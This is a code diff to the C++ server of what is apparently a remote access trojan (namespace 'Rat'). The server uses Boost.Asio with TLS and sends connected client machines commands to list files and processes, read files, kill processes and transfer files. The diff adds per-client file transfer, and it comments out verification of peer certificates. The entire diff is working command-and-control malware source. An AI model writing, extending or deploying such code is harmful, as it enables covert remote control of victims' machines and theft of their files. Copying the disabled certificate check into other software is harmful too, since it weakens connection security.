@@ -1,4 +1,5 @@
 #include "Server.hpp"
+#include "Utils.hpp"
 #include <iostream>
 #include <thread>
 #include <random>
@@ -41,7 +42,8 @@ namespace Rat
         : networkManager_(), acceptor_(networkManager_.get_io_context(), boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
         
     {
-        networkManager_.setup_ssl_context(true, "./server.crt", "./server.key", "./ca.crt");
+        networkManager_.setup_ssl_context_server("server.crt", "server.key", "ca.crt", "dh2048.pem");
+        // networkManager_.setup_ssl_context(true, "./server.crt", "./server.key", "./ca.crt");
     }
 
     Server::~Server() 
@@ -88,7 +90,7 @@ namespace Rat
             } 
             catch (const std::exception& e) 
             {
-                std::cout << "Invalid ID: " << e.what() << "\n";
+                // std::cout << "Invalid ID: " << e.what() << "\n";
             }
         }
         file.close();
@@ -102,7 +104,7 @@ namespace Rat
         acceptor_.async_accept(socket->lowest_layer(),
             [this, socket](const boost::system::error_code& ec) {
                 if (!ec) {
-                    socket->set_verify_mode(boost::asio::ssl::verify_peer);
+                    // socket->set_verify_mode(boost::asio::ssl::verify_peer);
                     socket->async_handshake(boost::asio::ssl::stream_base::server,
                         [this, socket](const boost::system::error_code& ec) {
                             if (!ec) {
@@ -159,7 +161,7 @@ namespace Rat
                 auto it = clients_.find(client);
                 if (it != clients_.end()) 
                 {
-                    if(it->second == uint64_t(-1)) {std::cout << "Debug set size: " << clients_.size() << " " << packet.type() << std::endl;}
+                    // if(it->second == uint64_t(-1)) {std::cout << "Debug set size: " << clients_.size() << " " << packet.type() << std::endl;}
                     std::cout << "Client (" << client->lowest_layer().remote_endpoint().address().to_string() + "_" + std::to_string(clients_[client]) << "): "
                             << packet.chunked_data().payload() << "\n";
                 }
@@ -181,24 +183,63 @@ namespace Rat
         std::cout << "Enter packet type (LIST_FILES, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
         while (std::getline(std::cin, input)) 
         {
+
+            std::vector<std::string> list_commands = Utils::handleCommand(input);
+            std::cout << "Debug size: " << list_commands.size() << std::endl;
+            for(auto x: list_commands) {std::cout << x << std::endl;}
+            if(list_commands.size() == 2)
+            {
+                std::string command = list_commands[0];
+                std::string object = list_commands[1];
+                uint64_t object_id = parseStaticIdPayload(object);
+                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
+                // O(n) => optimizer in the furture 
+                if(!socket_client) continue;
+                if (command == "transfer_file")
+                {
+                    std::cout << "Debug transfer_file \n";
+                    rat::Packet packet_transfer_file;
+                    packet_transfer_file.set_type(rat::Packet::COMMAND);
+                    packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
+                    packet_transfer_file.set_source_id("client_" + std::to_string(object_id));
+                    packet_transfer_file.set_destination_id("server_0");
+                    packet_transfer_file.set_encrypted(true);
+                    auto* chunked = packet_transfer_file.mutable_chunked_data();
+                    chunked->set_data_id("TRANSFER_FILE" + std::to_string(std::rand()));
+                    chunked->set_sequence_number(0);
+                    chunked->set_total_chunks(1);
+                    chunked->set_payload(command);
+                    chunked->set_success(true);
+                    networkManager_.send(socket_client, packet_transfer_file, [](const boost::system::error_code& ec) 
+                    {
+                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                    });
+                }
+            }
+
+            if (input == "list_clients") 
+            {
+                ServerGUI::displayClients(clients_);
+                continue;
+            }
             rat::Packet packet;
             packet.set_packet_id("server_" + std::to_string(std::rand()));
             packet.set_source_id("server");
             packet.set_destination_id("all_clients");
 
-            if (input == "LIST_FILES") 
+            if (input == "list_files") 
             {
                 packet.set_type(rat::Packet::LIST_FILES);
             } 
-            else if (input == "LIST_PROCESSES") 
+            else if (input == "list_processes") 
             {
                 packet.set_type(rat::Packet::LIST_PROCESSES);
             } 
-            else if (input == "READ_FILE") 
+            else if (input == "read_file") 
             {
                 packet.set_type(rat::Packet::READ_FILE);
             } 
-            else if (input == "KILL_PROCESS") 
+            else if (input == "kill_process") 
             {
                 packet.set_type(rat::Packet::KILL_PROCESS);
             } 
@@ -210,7 +251,7 @@ namespace Rat
             }
 
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_payload(generateRandomData(10));
+            chunked->set_payload(input);
 
             for (auto& client : clients_) 
             {
@@ -248,7 +289,7 @@ namespace Rat
         } 
         catch (const std::exception& e) 
         {
-            std::cout << "Invalid number: " << e.what() << "\n";
+            // std::cout << "Invalid number: " << e.what() << "\n";
             return -1;
         }
     }
@@ -281,7 +322,7 @@ namespace Rat
         response.set_packet_id("server_0_" + std::to_string(std::rand()));
         response.set_source_id("server_0");
         response.set_destination_id("client_" + std::to_string(source_id));
-        response.set_encrypted(false);
+        response.set_encrypted(true);
         auto* chunked = response.mutable_chunked_data();
         chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
         chunked->set_sequence_number(0);
@@ -292,12 +333,12 @@ namespace Rat
         sendCommandToClient(client, response);
         {
             std::lock_guard<std::mutex> lock(client_mutex_);
-            std::cout << "Debug: " << source_id << std::endl;
-            std::cout << "Debug set clients before insert: ";
+            // std::cout << "Debug: " << source_id << std::endl;
+            // std::cout << "Debug set clients before insert: ";
             for(auto x: clients_) { std::cout << x.first << "-" << x.second << std::endl;}
             // clients_.insert({client, source_id});
             clients_[client] = source_id;
-            std::cout << "Debug set clients after insert: ";
+            // std::cout << "Debug set clients after insert: ";
             for(auto x: clients_) {std::cout << x.first << "-" << x.second << std::endl;}
         }
     }
